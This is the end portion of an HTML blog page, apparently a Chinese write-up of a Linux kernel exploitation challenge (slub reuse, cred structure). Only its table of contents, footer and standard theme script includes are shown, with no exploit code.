+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前置知识"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#内核"><span class="nav-number">1.1.</span> <span class="nav-text">内核</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#slub重用"><span class="nav-number">1.2.</span> <span class="nav-text">slub重用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用流程"><span class="nav-number">3.</span> <span class="nav-text">利用流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cred结构体大小"><span class="nav-number">3.1.</span> <span class="nav-text">cred结构体大小</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
